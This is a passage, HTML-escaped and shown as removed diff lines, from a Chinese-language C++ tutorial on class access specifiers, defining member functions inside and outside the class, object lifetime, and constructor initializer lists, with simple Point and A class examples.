-&lt;li&gt;&lt;strong&gt;public&lt;/strong&gt; 与 &lt;strong&gt;private&lt;/strong&gt; 为属性 / 方法限制的关键字，private 表示该部分内容是私密的，不能被外部所访问或调用，只能被本类内部访问；而 public 表示公开的属性和方法，外界可以直接访问或者调用。 一般来说类的属性成员都应设置为 private, public 只留给那些被外界用来调用的函数接口，但这并非是强制规定，可以根据需要进行调整；&lt;/li&gt;
-&lt;li&gt;结束部分的分号不能省略。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;三-c类的实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-c类的实现&#34;&gt;#&lt;/a&gt; 三、C++ 类的实现&lt;/h2&gt;
-&lt;p&gt;在上面的定义示例中我们只是定义了这个类的一些属性和方法声明，并没有去实现它，类的实现就是完成其方法的过程。类的实现有两种方式，一种是在类定义时完成对成员函数的定义，另一种是在类定义的外部进行完成。&lt;/p&gt;
-&lt;h3 id=&#34;1-在类定义时定义成员函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-在类定义时定义成员函数&#34;&gt;#&lt;/a&gt; 1&amp;gt;. 在类定义时定义成员函数&lt;/h3&gt;
-&lt;p&gt;成员函数的实现可以在类定义时同时完成，如代码:&lt;br&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Point&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void setPoint(int x, int y) //实现setPoint函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        xPos = x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        yPos = y;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void printPoint() //实现printPoint函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout&amp;lt;&amp;lt; &amp;quot;x = &amp;quot; &amp;lt;&amp;lt; xPos &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout&amp;lt;&amp;lt; &amp;quot;y = &amp;quot; &amp;lt;&amp;lt; yPos &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       int xPos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       int yPos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Point M; //用定义好的类创建一个对象 点M&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    M.setPoint(10, 20); //设置 M点 的x,y值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    M.printPoint(); //输出 M点 的信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;运行输出:&lt;br&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;x = 10 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;y = 20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;与类的定义相比，在类内实现成员函数不再是在类内进行声明，而是直接将函数进行定义，在类中定义成员函数时，编译器默认会争取将其定义为 inline 型函数&lt;/p&gt;
-&lt;h3 id=&#34;2-在类外定义成员函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-在类外定义成员函数&#34;&gt;#&lt;/a&gt; 2&amp;gt;. 在类外定义成员函数&lt;/h3&gt;
-&lt;p&gt;在类外定义成员函数通过在类内进行声明，然后在类外通过作用域操作符：：进行实现，形式如下:&lt;br&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; 返回类型 类名::成员函数名(参数列表)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     //函数体&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Point&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void setPoint(int x, int y); //在类内对成员函数进行声明&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void printPoint();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int xPos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int yPos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void Point::setPoint(int x, int y) //通过作用域操作符 &amp;#x27;::&amp;#x27; 实现setPoint函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    xPos = x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    yPos = y;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void Point::printPoint() //实现printPoint函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout&amp;lt;&amp;lt; &amp;quot;x = &amp;quot; &amp;lt;&amp;lt; xPos &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout&amp;lt;&amp;lt; &amp;quot;y = &amp;quot; &amp;lt;&amp;lt; yPos &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Point M; //用定义好的类创建一个对象 点M&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    M.setPoint(10, 20); //设置 M点 的x,y值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    M.printPoint(); //输出 M点 的信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;
- 依 setPoint 成员函数来说，在类内声明的形式为 &lt;strong&gt;void setPoint(int x, int y)&lt;/strong&gt;; 那么在类外对其定义时函数头就应该是 &lt;strong&gt;void Point::setPoint(int x, int y)&lt;/strong&gt; 这种形式，其返回类型、成员函数名、参数列表都要与类内声明的形式一致。&lt;/p&gt;
-&lt;h2 id=&#34;四-对象的作用域-可见域与生存周期&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四-对象的作用域-可见域与生存周期&#34;&gt;#&lt;/a&gt; 四、对象的作用域、可见域与生存周期&lt;/h2&gt;
-&lt;p&gt;类对象的作用域、可见域以及生存周期与普通变量的保持相同，当对象生存周期结束时对象被自动撤销，所占用的内存被回收，需要注意的是，如果对象的成员函数中有使用 new 或者 malloc 申请的动态内存程序不会对其进行释放，需要我们手动进行清理，否则会造成内存泄露。&lt;/p&gt;
-&lt;h2 id=&#34;c-类的定义和使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#c-类的定义和使用&#34;&gt;#&lt;/a&gt; c++ 类的定义和使用&lt;/h2&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;quot;stdafx.h&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int n2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int n1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A() :n2(34), n1(n2+1) &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void Print() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout &amp;lt;&amp;lt; &amp;quot;n1:&amp;quot; &amp;lt;&amp;lt; n1 &amp;lt;&amp;lt; &amp;quot;, n2: &amp;quot; &amp;lt;&amp;lt; n2 &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    A a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a.Print();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    getchar();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return 1;&lt;/span&gt;&lt;br&gt;&lt;span 